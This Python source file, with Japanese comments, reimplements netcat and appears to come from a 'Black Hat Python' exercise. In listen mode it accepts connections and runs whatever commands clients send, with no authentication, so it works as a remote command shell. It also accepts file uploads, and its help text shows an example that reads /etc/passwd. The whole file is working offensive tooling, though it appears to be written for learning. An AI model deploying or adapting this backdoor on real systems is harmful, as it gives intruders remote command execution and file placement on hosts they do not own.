#Netcatを実装
#server python netcat.py -t 10.0.2.15 -p 5555 -l -c
#client python netcat.py -t 10.0.2.15 -p 5555
import argparse
import locale
import os
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return

    #windows上で実行する場合はtrue。組み込みコマンドを使える
    if os.name == "nt":
        shell = True
    else:
        shell = False

    #ローカルのOS上でコマンドを実行
    """
    
    文字列で与える→shell=True
    ・ クオート混入による誤作動リスク
    文字列のリストで与える→shell=False (default)
    ・ ワイルドカード等が使えず，低自由度

    （公式）
    shell が True なら、指定されたコマンドはシェルによって実行されます。あなたが Python を主として (ほとんどのシステムシェル以上の) 強化された制御フローのために使用していて、さらにシェルパイプ、ファイル名ワイルドカード、環境変数展開、~ のユーザーホームディレクトリへの展開のような他のシェル機能への簡単なアクセスを望むなら、これは有用かもしれません。
    （公式）
    shell=True でシェルを明示的に呼びだした場合、シェルインジェクション の脆弱性に対処するための、すべての空白やメタ文字の適切なクオートの保証はアプリケーションの責任になります。

    shell=Trueでしか実現できないコマンド
    # 文字列リストで与える方法（以降の5つはこの記法では不可）
    print(subprocess.call(['ls','-l'], shell=False)) # 0

    # シェルパイプライン
    print(subprocess.call('echo -e "a\nb\nc" | wc -l', shell=True)) # 0
    # セミコロン
    print(subprocess.call('echo Failed.; exit 1', shell=True)) # 1
    # ワイルドカード
    print(subprocess.call('ls -l *.py', shell=True)) # 0
    # 環境変数
    print(subprocess.call('echo $HOME', shell=True)) # 0
    # HOMEを表すチルダ記号
    print(subprocess.call('ls -l ~', shell=True)) # 0


    shell = Trueの場合 内部コマンドなどを使う事が出来る（/usr/binに無いコマンド）。cdなど
    shell = Falseの場合 外部コマンドを使用できる
    """
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT,
                                     shell=shell)

    #windowsのロケールによってデコード文字コードを分ける。cp932=ShiftJis default=UTF-8
    if locale.getdefaultlocale() == ('ja_JP', 'cp932'):
        return output.decode('cp932')
    else:
        return output.decode()


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        #Server
        if self.args.listen:
            self.listen()
        #Client
        else:
            self.send()

    #クライアント
    def send(self):
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)

        try:
            #データを受け取る
            while True:
                recv_len = 1
                response = ''
                #データを読み込み、表示
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    #コマンドを送信
                    self.socket.send(buffer.encode())
        #CTRL + C
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()
        
        except EOFError as e:
            print(e)

    #サーバー
    def listen(self):
        print('listening')
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def handle(self, client_socket):
        #コマンドを実行し、結果を返す
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        #ファイルアップロード
        elif self.args.upload:
            #データを受信
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                    print(len(file_buffer))
                else:
                    break

            #ファイルに書き込む
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        #シェルを起動
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'<BHP:#> ')
                    #改行判定。改行が追加されるまで読み込む
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    #コマンドを実行
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


if __name__ == '__main__':
    #コマンドラインインターフェースを作成
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        #--help
        epilog=textwrap.dedent('''実行例:
        # 対話型コマンドシェルの起動
        netcat.py -t 192.168.1.108 -p 5555 -l -c
        # ファイルのアップロード
        netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.whatisup
        # コマンドの実行
        netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"
        # 通信先サーバーの135番ポートに文字列を送信
        echo 'ABCDEFGHI' | ./netcat.py -t 192.168.1.108 -p 135
        # サーバーに接続
        netcat.py -t 192.168.1.108 -p 5555
        '''))
    #options
    parser.add_argument('-c', '--command', action='store_true', help='対話型シェルの初期化')
    parser.add_argument('-e', '--execute', help='指定のコマンドの実行')
    parser.add_argument('-l', '--listen', action='store_true', help='通信待受モード')
    parser.add_argument('-p', '--port', type=int, default=5555, help='ポート番号の指定')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='IPアドレスの指定')
    parser.add_argument('-u', '--upload', help='ファイルのアップロード')
    args = parser.parse_args()
    #リスナーの場合と、それ以外の場合
    if args.listen:
        buffer = ''
    else:
        #クライアントの場合は、入力を待つ
        buffer = sys.stdin.read()

    #bufferの内容を送って実行
    nc = NetCat(args, buffer.encode('utf-8'))
    nc.run()
